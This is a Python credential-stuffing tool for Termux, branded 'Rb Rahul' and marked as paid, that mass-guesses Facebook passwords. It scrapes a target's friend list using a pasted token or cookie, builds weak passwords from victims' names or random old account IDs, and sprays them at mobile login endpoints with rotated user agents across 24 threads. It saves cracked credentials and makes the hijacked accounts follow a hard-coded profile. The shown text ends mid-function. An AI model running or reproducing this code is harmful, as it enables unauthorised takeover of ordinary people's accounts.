
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
C = '\033[96;1m'
N = '\x1b[0m'
import os
try:
	import requests
except ImportError:
	os.system("pip install requests")

try:
	import concurrent.futures
except ImportError:
	os.system("pip install futures")

import os
import sys
import time
import requests
import random
import platform
import base64
import subprocess
from concurrent.futures import ThreadPoolExecutor
import requests,bs4,uuid,json,os,sys,random,datetime,time,re,subprocess
try:
	import rich
except ImportError:
	os.system('pip install rich')
	time.sleep(1)
	try:
		import rich
	except ImportError:
		exit(' [×] Cant Install Rich Module, Try Manual Install (pip install rich)')
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
import base64
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from urllib.parse import quote
# UA LIST
#ugen2=open('frec.txt','r').read().splitlines()
#ugen=open('m.txt','r').read().splitlines()
ugen2=['Mozilla/5.0 (Android 12; LENOVO Lenovo TB125FU) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36']
ugen=['Mozilla/5.0 (Linux; Android 8.1.0; Lightyear) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; 1CY) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 8.1.0; M7sLite) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 12; Lenovo TB-J607Z) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Linux; Android 10; TPC-G1010 Build/QP1A.190711.020.C3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Safari/537.36 [FB_IAB/FB4A;FBAV/394.1.0.51.107', 'Mozilla/5.0 (Linux; Android 11; Twist Tab Build/RP1A.201005.006; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.141 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 9; GRAVITY_OCTACORE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36', 'Mozilla/5.0 (Android 12; LENOVO Lenovo TB125FU) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36',
'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.12; ips-agent) Gecko/20050922 Fedora/1.0.7-1.1.fc4 Firefox/1.0.7','Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:14.0; ips-agent) Gecko/20100101 Firefox/14.0.1','Mozilla/5.0 (compatible; ips-agent)','BlackBerry9630/5.0.0.732 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/102 ips-agent','BlackBerry9000/4.6.0.167 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/102 ips-agent','Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 7.0; SM-A310F Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36 OPR/42.7.2246.114996', 'Opera/9.80 (Android 4.1.2; Linux; Opera Mobi/ADR-1305251841) Presto/2.11.355 Version/12.10', 'Opera/9.80 (J2ME/MIDP; Opera Mini/5.1.21214/28.2725; U; ru) Presto/2.8.119 Version/11.10', 'Mozilla/5.0 (iPhone; CPU iPhone OS 7_1_2 like Mac OS X) AppleWebKit/537.51.2 (KHTML, like Gecko) OPiOS/10.2.0.93022 Mobile/11D257 Safari/9537.53', 'Mozilla/5.0 (Android 7.0; Mobile; rv:54.0) Gecko/54.0 Firefox/54.0', 'Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 like Mac OS X) AppleWebKit/603.2.4 (KHTML, like Gecko) FxiOS/7.5b3349 Mobile/14F89 Safari/603.2.4', 'Mozilla/5.0 (Linux; U; Android 7.0; en-US; SM-G935F Build/NRD90M) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/534.30', 'Mozilla/5.0 (Linux; Android 5.1.1; SM-N750K Build/LMY47X; ko-kr) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Mobile Safari/537.36 Puffin/6.0.8.15804AP', 'Mozilla/5.0 (X11; U; Linux x86_64; en-IE) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.114 Safari/537.36 Puffin/5.2.6IP', 'Mozilla/5.0 (Linux; Android 7.0; SAMSUNG SM-G955U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/5.4 Chrome/51.0.2704.106 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 6.0; Lenovo K50a40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.137 YaBrowser/17.4.1.352.00 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 7.0; en-us; MI 5 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/53.0.2785.146 Mobile Safari/537.36 XiaoMi/MiuiBrowser/9.0.3', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; Microsoft; Lumia 950)', 'Mozilla/5.0 (Windows Phone 10.0; Android 6.0.1; Microsoft; Lumia 950) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Mobile Safari/537.36 Edge/15.14977', 'Mozilla/5.0 (BB10; Kbd) AppleWebKit/537.35+ (KHTML, like Gecko) Version/10.3.3.2205 Mobile Safari/537.35+','Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (iPad; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Safari/605.1.15', 'Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Nexus 6P Build/OPM7.181205.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.11.1.1197 Mobile Safari/537.36', 'Mozilla/5.0 (compatible; MSIE 10.0; Windows Phone 8.0; Trident/6.0; IEMobile/10.0; ARM; Touch; NOKIA; Lumia 920) UCBrowser/10.1.0.563 Mobile', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48', 'Opera/9.80 (Windows NT 6.1) Presto/2.12.388 Version/12.16', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.97 Safari/537.36 OPR/65.0.3467.48', 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057', 'Mozilla/5.0 (Linux; Android 8.1.0; Pixel Build/OPM4.171019.021.D1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Mobile Safari/537.36 EdgA/42.0.0.2057', 'Mozilla/5.0 (BB10; Touch) AppleWebKit/537.1+ (KHTML, like Gecko) Version/10.0.0.1337 Mobile Safari/537.1+', 'Mozilla/5.0 (PlayBook; U; RIM Tablet OS 2.1.0; en-US) AppleWebKit/536.2+ (KHTML, like Gecko) Version/7.2.1.0 Safari/536.2+', 'Mozilla/5.0 (BlackBerry; U; BlackBerry 9900; en-US) AppleWebKit/534.11+ (KHTML, like Gecko) Version/7.0.0.187 Mobile Safari/534.11+', 'Mozilla/5.0 (Linux; Android 10; Pixel 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Mobile Safari/537.36', 'Mozilla/5.0 (Linux; Android 4.3; Nexus 7 Build/JSS15Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/86.0.4240.198 Mobile/15E148 Safari/604.1', 'Mozilla/5.0 (X11; CrOS x86_64 10066.0.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36', 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1', 'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko']
# INDICATION
id,id2,loop,akun,oprek,method,lisensiku,taplikasi,tokenku,uid,lisensikuni= [],[],0,[],[],[],[],[],[],[],[]
cp = 0
ok = []
try:
	os.mkdir('/sdcard/')
except:pass
# COLORS
x = '\33[m' 
k = '\033[93m' 
h = '\x1b[1;92m' 
hh = '\033[32m' 
u = '\033[95m' 
K = '\033[95m' 
kk = '\033[33m' 
b = '\33[1;96m' 
p = '\x1b[0;34m' 
# Converter 
dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'Agustus','9':'September','10':'October','11':'November','12':'December'}
dic2 = {'01':'January','02':'February','03':'March','04':'April','05':'May','06':'June','07':'July','08':'Agustus','09':'September','10':'October','11':'November','12':'December'}
tgl = datetime.datetime.now().day
bln = dic[(str(datetime.datetime.now().month))]
thn = datetime.datetime.now().year
okc = 'OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
cpc = 'CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'
# CLEAR
def clear():
	os.system('clear')
# BACK
def back():
	login()

ahsan="ALE-"
imt="-M4786=="
ak="AHSAN-"
myid=uuid.uuid4().hex[:10].upper()
try:
	key1 = open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'r').read()
except:
	kok=open('/data/data/com.termux/files/usr/bin/.mrahsan-cov', 'w')
	kok.write(myid+imt)
	kok.close()
def login():
	try:
		token = open('.token.txt','r').read()
		tokenku.append(token)
		try:
			sy = requests.get('https://graph.facebook.com/me?access_token='+tokenku[0])
			public_menu()
		except KeyError:
			Public()
		except requests.exceptions.ConnectionError:
			clear()
			print(logo)
			print ( ' [×] Connection Timeout')
			exit()
	except IOError:
		Public()
def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e);sys.stdout.flush();time.sleep(0.01)
############### #LOGO############## ## 

# LOGIN
def Public():
	clear()
	print(logo)
	print  (' [01] Login With Token\n [02] Login With Cookie')
	pil=input('\n [#] Select One : ')
	if pil in ['1','01']:
		panda = input(' [+] Token : ')
		akun=open('.token.txt','w').write(panda)
		try:
			tes = requests.get('https://graph.facebook.com/me?access_token='+panda)
			tes3 = json.loads(tes.text)['id']
			print (" [] Login Successful")
			login()
		except KeyError:
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			Public()
		except requests.exceptions.ConnectionError:
			print ( ' [×] Connection Timeout')
			exit()
	elif pil in ['2','02']:
		try:
			cookie=input(" [+] Cookie : ")
			data = requests.get("https://business.facebook.com/business_locations", headers = {"user-agent": "Mozilla/5.0 (Linux; Android 12.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com","origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8","content-type":"text/html; charset=utf-8"}, cookies = {"cookie":cookie}) 
			find_token = re.search("(EAAG\w+)", data.text)
			ken=open(".token.txt", "w").write(find_token.group(1))
			print (" [] Login Successful")
			login()
		except Exception as e: 
			os.system("rm -f .token.txt")
			print( ' [×] Login Failed ')
			time.sleep(2.5)
			login()
			exit()
def public_menu():
	try:
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	clear()
	print(logo)
	pil = input('\n [+] Enter ID Target : ')
	try:
		koh2 = requests.get('https://graph.facebook.com/v2.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0]).json()
		for pi in koh2['friends']['data']:
			id.append(pi['id']+'|'+pi['name'])
		print(' [] Total : '+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print (' [#] Connection Time Out')
		exit()
	except (KeyError,IOError):
		print(' [!] Not public Or Token Expire')
		exit()
def File():
			clear()
			print(logo)
			try:
				fileX = input ('\n [+] Enter file path : ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				setting()
			except IOError:
				exit("\n [!] file %s not found"%(fileX))

def setting():
	hu = ("2")
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print (' [!] Choose Correct Option')
		exit()
	clear()
	print(logo);print ('\n [01] Method 1 ');print (' [02] Method 2 \033[1;97m')
	hc = input ("\n [#] method : ")
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('free')
	else:
		method.append('mobile')
	passmenu()
def passmenu():
	clear()
	print(logo);print  ('\n [01] First name digit pass \n [02] All Name Password \n [03] All Name+ password')
	passmen=input('\n [#] Select Pass : ')
	if passmen in ['1','01']:
		first()
	elif passmen in ['2','02']:
		name()
	elif passmen in ['3','03']:
		name2()
	else:
		passmenu()
		
def first():
	clear()
	print(logo);print( ' [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n')
	with tred(max_workers=24) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
def name():
	clear()
	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
	with tred(max_workers=24) as pool:
		for yuzong in id2:
			try:
				idf,nmf = yuzong.split('|')
				xz = nmf.split(' ')
				if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				else:
					pwv = [name, xz[0]+xz[0],xz[0]+xz[1]+"12345", xz[0]+xz[1]+"786",xz[0]+xz[1]+"123",xz[0]+xz[1]+"1234"]
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(free,idf,pwv)
				else:
					pool.submit(crack,idf,pwv)
			except:
				pass
def name2():
	clear()
	print(logo);print( '\n [] OK Result Saved To : \033[1;92mOK/%s\033[1;97m\n [] CP Result Saved To : \033[1;91mCP/%s\033[1;97m\n [!] \033[1;96mTurn Airplane Mode On/Off Every 5 Minutes\033[1;0m\n'%(okc,cpc))
	with tred(max_workers=24) as pool:
		for yuzong in id2:
			idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['445566']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'12345')
					pwv.append(frs+'1234')
					pwv.append(frs+'786')
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'free' in method:
				pool.submit(free,idf,pwv)
			else:
				pool.submit(crack,idf,pwv)
	
# CRACKER
def crack(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ RAHUL ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'p.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://p.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://p.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'p.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://p.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://p.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				cp +=1
				print( f'\r\x1b[1;91m [ RAHUL-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ RAHUL-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/ids/ok.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def free(idf,pwv):
	global loop,ok,cp
	bi = random.choice([u,k,kk,b,h,hh])
	pers = loop*100/len(id2)
	fff = '%'
	sys.stdout.write('\r %s[ RAHUL ] %s•%s • OK:%s • CP:%s  '%(bi,loop,len(id2),len(ok),cp)),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	for pw in pwv:
		try:
			pw = pw.lower()
			ses.headers.update({"Host":'free.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://free.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://free.facebook.com/login/save-device/'"}
			ses.headers.update({"Host":'free.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":'https://free.facebook.com/login/device-based/password/?uid='+idf+'&flow=login_no_pin&refsrc=deprecated&locale=id_ID&_rdr',"accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				rint( f'\r\x1b[1;91m [ RAHUL-CP ] {idf} | {pw}')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				coki=po.cookies.get_dict()
				coki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r\x1b[1;92m [ RAHUL-OK ] {idf} | {pw}')
				wrt =('%s - %s' % (idf,pw))
				ok.append(wrt)
				open('/sdcard/RAHUL-OK.txt','a').write('%s\n' % wrt)
				follow(ses,coki)
				break

			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
def follow(ses,coki):
	ses.headers.update({"accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	r = sop(ses.get('https://free.facebook.com/profile.php?id=100067945261995', cookies={'cookie': coki}).text, 'html.parser')
	get = r.find('a', string='Follow').get('href')
	ses.get(('https://free.facebook.com' + str(get)), cookies={'cookie': coki}).text
logo = ("""\033[1;32m      
  ____  _       ____       _           _ 
 |  _ \| |__   |  _ \ __ _| |__  _   _| |
 | |_) | '_ \  | |_) / _` | '_ \| | | | |
 |  _ <| |_) | |  _ < (_| | | | | |_| | |
 |_| \_\_.__/  |_| \_\__,_|_| |_|\__,_|_|
                                          \033
______________×______________________
  
  Auther   :  Rb Rahul
  Github   :  Full Hide
  Facebook :  Rahul Rbc
  Fb Group :  Rb Rahul Command
  Status   :  Paid
  Contact  :  +918736899399
  Version  :  1.1.5
________________×______________________\033[1;37m""")

class Main:
	def __init__(self):
		self.id = []
		self.ok = []
		self.cp = []
		self.loop = 0
		os.system("clear")
		print(logo)
		print("\n [1] File Cloning")
		print(" [2] Public Cloning")
		print(" [3] Create File")
		print(" [4] 2009-10 Cloning")
		print(" [5] 2011-14 Cloning")
		print(" [E] Exit Programming\n")
		RAHUL =input(" Choose : ")
		if RAHUL in ["1", "01"]:
			File()
		if RAHUL in ["2", "02"]:
			Public()
		if RAHUL in ["3", "03"]:
			os.system("python Dump.py")
		if RAHUL in ["4", "04"]:
			self.old()
		if RAHUL in ["5", "05"]:
			self.old2()
			exit()
		else:
			print (" Select Correctly ")
			time.sleep(1)
			Main()

	def old(self):
		x = 111111111
		xx = 999999999
		idx = "100000" 
		os.system('clear');print(logo)
		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=24) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice
		sys.stdout.write(
			"\r [ RAHUL ] %s/%s -> Ok:-%s - Cp:-%s "%(self.loop, len(self.id), len(self.cp), len(self.ok))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			ses = requests.Session()
			headers = {
				"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)), 
				"x-fb-sim-hni": str(random.randint(20000, 40000)), 
				"x-fb-net-hni": str(random.randint(20000, 40000)), 
				"x-fb-connection-quality": "EXCELLENT",
				"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
				"user-agent": rua, 
				"content-type": "application/x-www-form-urlencoded", 
				"x-fb-http-engine": "Liger"
			}
			response = ses.get("https://b-api.facebook.com/method/auth.login?format=json&email="+str(uid)+"&password="+str(pw)+"&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true", headers=headers) 
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[ RAHUL-OK ] %s | %s\033[0;97m         "%(uid, pw))
				print ("\r \033[0;92m Congrats Bro ")
				self.ok.append("%s|%s"%(uid, pw))
				open("2009-RAHUL-Ok.txt","a").write(" %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;92m[ RAHUL-OK ] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("2009-RAHUL-OK.txt","a").write(" %s | %s\n"%(uid, pw))
				break
			else:
				continue

		self.loop +=1

	def old2(self):
		x = 1111111111
		xx = 9999999999
		idx = "10000" 
		os.system('clear');print(logo)
		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
		try:
			for n in range(limit):
				_ = random.randint(x,xx)
				__ = idx
				self.id.append(__+str(_))
			
			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
			with ThreadPoolExecutor(max_workers=24) as coeg:
				print("\n\033[1;32m [!] USE (123456) FOR IDZ\033[1;37m ")
				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
				if len(listpass)<=5:
					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
				os.system("clear")
				print(logo)
				print("\n%s [+] OK RESULTS SAVED IN -> ok.txt"%(Y))
				print("%s [+] CP RESULTS SAVED IN -> cp.txt"%(G))
				print("%s [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS\x1b[0m\n"%(P))
				for user in self.id:
					coeg.submit(self.api, user, listpass.split(","))
			exit("\n\n [>>] CRACK COMPLETE...")
		except Exception as e:exit(str(e))

	def api(self, uid, pwx):
		rua = random.choice
		sys.stdout.write(
